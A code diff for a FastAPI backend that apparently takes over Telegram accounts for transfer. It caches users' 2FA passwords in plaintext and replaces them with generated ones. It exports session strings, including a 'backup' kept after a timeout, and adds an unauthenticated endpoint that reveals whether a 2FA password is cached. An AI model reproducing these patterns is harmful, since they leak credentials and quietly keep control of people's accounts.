@@ -79,6 +79,61 @@ class DeliveryConfirmRequest(BaseModel):
     received: bool = True
 
 
+# ============== Session Cache (RAM) ==============
+
+# Cache for 2FA passwords and session start times
+# Format: {phone: {"2fa_password": str, "started_at": datetime, "telegram_id": int}}
+session_cache: Dict[str, Dict] = {}
+
+# Session timeout in seconds (30 minutes)
+SESSION_TIMEOUT_SECONDS = 30 * 60
+
+
+def cache_session_data(phone: str, **kwargs):
+    """Cache session data in RAM"""
+    if phone not in session_cache:
+        session_cache[phone] = {"started_at": datetime.utcnow()}
+    session_cache[phone].update(kwargs)
+
+
+def get_cached_data(phone: str, key: str = None):
+    """Get cached data for a phone"""
+    if phone not in session_cache:
+        return None
+    if key:
+        return session_cache[phone].get(key)
+    return session_cache[phone]
+
+
+def clear_session_cache(phone: str):
+    """Clear cached data for a phone"""
+    if phone in session_cache:
+        del session_cache[phone]
+
+
+def check_session_timeout(phone: str) -> bool:
+    """Check if session has timed out (30 min limit)"""
+    data = get_cached_data(phone)
+    if not data or "started_at" not in data:
+        return False  # No session started
+    
+    started_at = data["started_at"]
+    elapsed = (datetime.utcnow() - started_at).total_seconds()
+    return elapsed > SESSION_TIMEOUT_SECONDS
+
+
+def get_session_remaining_time(phone: str) -> int:
+    """Get remaining time in seconds"""
+    data = get_cached_data(phone)
+    if not data or "started_at" not in data:
+        return SESSION_TIMEOUT_SECONDS
+    
+    started_at = data["started_at"]
+    elapsed = (datetime.utcnow() - started_at).total_seconds()
+    remaining = SESSION_TIMEOUT_SECONDS - elapsed
+    return max(0, int(remaining))
+
+
 # ============== Helper Functions ==============
 
 def get_pyrogram():
@@ -140,12 +195,16 @@ async def init_auth(request: InitAuthRequest, req: Request):
             await update_account(phone, status=AuthStatus.PENDING_CODE)
             await log_auth_action(phone, "init_auth", "success")
             
+            # Start session timer (30 min limit)
+            cache_session_data(phone, started_at=datetime.utcnow())
+            
             duration = time.time() - start_time
             response = {
                 "status": result["status"],
                 "message": "Verification code sent to Telegram" if result["status"] == "code_sent" else "Already logged in",
                 "phone_code_hash": result.get("phone_code_hash"),
                 "transfer_mode": request.transfer_mode,
+                "session_timeout": SESSION_TIMEOUT_SECONDS,
                 "duration": duration
             }
             log_response(logger, 200, response)
@@ -249,6 +308,9 @@ async def verify_auth(request: VerifyAuthRequest, req: Request):
                     telegram_id=telegram_id
                 )
                 
+                # Cache 2FA password for later use in finalize
+                cache_session_data(phone, two_fa_password=request.password, telegram_id=telegram_id)
+                
                 duration = time.time() - start_time
                 return {
                     "status": "authenticated",
@@ -256,6 +318,7 @@ async def verify_auth(request: VerifyAuthRequest, req: Request):
                     "telegram_id": telegram_id,
                     "target_email": email_info.get("email"),
                     "email_hash": email_info.get("hash"),
+                    "two_fa_cached": True,
                     "duration": duration
                 }
             else:
@@ -432,6 +495,26 @@ async def finalize_account(account_id: str, request: FinalizeRequest, req: Reque
     log_request(logger, "POST", f"/account/finalize/{phone}", None)
     
     try:
+        # Check session timeout (30 min limit)
+        if check_session_timeout(phone):
+            # Save session to backup before clearing
+            manager = get_pyrogram()
+            try:
+                backup_session = await manager.export_session_string(phone)
+                if backup_session:
+                    await update_account(phone, 
+                        pyrogram_session=backup_session,
+                        status=AuthStatus.EXPIRED
+                    )
+                    logger.warning(f"Session expired for {phone}, saved to backup")
+            except:
+                pass
+            clear_session_cache(phone)
+            raise HTTPException(
+                status_code=408, 
+                detail="انتهت المهلة (30 دقيقة). يرجى البدء من جديد. تم حفظ الجلسة احتياطياً."
+            )
+        
         account = await get_account(phone)
         if not account:
             raise HTTPException(status_code=404, detail="Account not found")
@@ -444,12 +527,16 @@ async def finalize_account(account_id: str, request: FinalizeRequest, req: Reque
         # Generate strong password
         new_password = generate_strong_password(24)
         
+        # Get cached 2FA password (from verify step)
+        cached_2fa = get_cached_data(phone, "two_fa_password")
+        current_2fa_password = request.two_fa_password or cached_2fa
+        
         # Enable/Change 2FA
-        if account.has_2fa and request.two_fa_password:
+        if account.has_2fa and current_2fa_password:
             # Change existing password
             result = await manager.change_2fa_password(
                 phone=phone,
-                current_password=request.two_fa_password,
+                current_password=current_2fa_password,
                 new_password=new_password
             )
         else:
@@ -487,17 +574,21 @@ async def finalize_account(account_id: str, request: FinalizeRequest, req: Reque
         )
         
         # Update account
+        # Note: export_session_string returns string directly, not dict
         await update_account(
             phone,
             status=AuthStatus.COMPLETED,
             generated_password=new_password,
-            pyrogram_session=pyrogram_session.get("session_string") if pyrogram_session else None,
+            pyrogram_session=pyrogram_session if isinstance(pyrogram_session, str) else None,
             telethon_session=telethon_session,
             completed_at=datetime.utcnow(),
             delivery_status=DeliveryStatus.READY
         )
         
         await log_auth_action(phone, "finalize", "success")
+        
+        # Clear session cache after successful finalize
+        clear_session_cache(phone)
         
         duration = time.time() - start_time
         return {
@@ -515,6 +606,28 @@ async def finalize_account(account_id: str, request: FinalizeRequest, req: Reque
     except Exception as e:
         logger.error(f"Error in finalize: {e}")
         raise HTTPException(status_code=500, detail=str(e))
+
+
+@router.get("/session/status/{account_id}")
+async def get_session_status(account_id: str):
+    """
+    Get session status including timeout info
+    """
+    phone = account_id
+    
+    remaining = get_session_remaining_time(phone)
+    is_expired = check_session_timeout(phone)
+    cached_data = get_cached_data(phone)
+    
+    return {
+        "account_id": phone,
+        "session_active": cached_data is not None,
+        "remaining_seconds": remaining,
+        "remaining_minutes": remaining // 60,
+        "is_expired": is_expired,
+        "has_cached_2fa": cached_data.get("two_fa_password") is not None if cached_data else False,
+        "timeout_limit": SESSION_TIMEOUT_SECONDS
+    }
 
 
 # ============== Email Endpoints ==============
